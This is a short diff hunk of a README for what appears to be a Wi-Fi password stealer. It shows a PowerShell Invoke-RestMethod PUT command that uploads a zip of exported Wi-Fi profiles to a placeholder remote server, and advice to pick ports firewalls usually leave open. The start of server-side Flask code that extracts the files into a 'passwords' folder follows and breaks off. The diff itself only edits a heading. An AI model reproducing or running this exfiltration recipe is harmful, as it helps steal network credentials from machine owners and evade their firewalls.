@@ -9,7 +9,7 @@ _**note:**  this exports all wifi networks into `C:\Users\<user>`) directory in 
 #### ↓ PowerShell command to send file via Http PUT request ↓ ####
 `Invoke-Restmethod -Uri http://[domain, IP or localhost]:[port]/wpg/temp.zip -Method Put -Infile .\temp.zip`
 _**note:** use ports that are usually open by default in firewall, for example `80`._
-### Run this code on server: ###
+### Run this python code on server: ###
 This code handle the zipfile and extract `XML` files into `passwords` folder.
 ```py
 from flask import Flask, request
